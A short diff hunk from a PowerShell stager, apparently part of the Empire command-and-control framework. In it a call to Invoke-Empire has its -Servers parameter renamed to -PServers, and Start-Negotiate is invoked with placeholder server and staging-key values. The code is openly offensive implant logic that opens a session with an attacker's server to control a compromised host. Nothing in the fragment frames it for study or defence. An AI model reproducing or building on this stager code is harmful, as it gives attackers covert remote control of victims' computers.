@@ -106,5 +106,5 @@ function Start-Negotiate{
     [GC]::Collect();
 
     # TODO: remove this shitty $server logic
-    Invoke-Empire -Servers @(($s -split "/")[0..2] -join "/") -SessionKey $key -SessionID $ID -Epoch $epoch;
+    Invoke-Empire -PServers @(($s -split "/")[0..2] -join "/") -SessionKey $key -SessionID $ID -Epoch $epoch;
 } Start-Negotiate -s "REPLACE_SERVER" -SK 'REPLACE_STAGING_KEY' -UA $u;
